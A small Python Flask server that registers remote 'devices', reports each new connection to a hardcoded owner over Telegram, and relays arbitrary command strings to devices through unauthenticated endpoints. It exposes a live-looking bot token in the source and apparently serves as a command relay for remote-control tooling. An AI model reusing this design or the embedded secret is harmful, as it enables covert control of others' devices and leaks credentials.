from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

BOT_TOKEN = '7814616506:AAHixHaptUH9hPcLq3awDS3mqHGScs3y9Yc'
OWNER_ID = '7554840326'
TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

connected_devices = {}  # device_id -> {'name': ..., 'chat_id': ...}

@app.route('/')
def home():
    return jsonify({"status": "ok"})

@app.route('/register', methods=['POST'])
def register():
    data = request.json
    device_id = data.get("device_id")
    name = data.get("device_name")
    chat_id = data.get("chat_id")

    if not all([device_id, name, chat_id]):
        return jsonify({"error": "Missing fields"}), 400

    connected_devices[device_id] = {
        "name": name,
        "chat_id": chat_id
    }

    msg = f"✅ New device connected:\n• Name: {name}\n• ID: {device_id}"
    requests.post(TELEGRAM_API, json={"chat_id": OWNER_ID, "text": msg})
    return jsonify({"status": "registered"})

@app.route('/devices', methods=['GET'])
def get_devices():
    return jsonify({
        device_id: info["name"] for device_id, info in connected_devices.items()
    })

@app.route('/send/<device_id>', methods=['POST'])
def send_command(device_id):
    cmd = request.json.get("command")
    if device_id not in connected_devices:
        return jsonify({"error": "Device not found"}), 404

    target = connected_devices[device_id]["chat_id"]
    requests.post(TELEGRAM_API, json={"chat_id": target, "text": cmd})
    return jsonify({"status": "sent"})

if __name__ == '__main__':
    import os
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
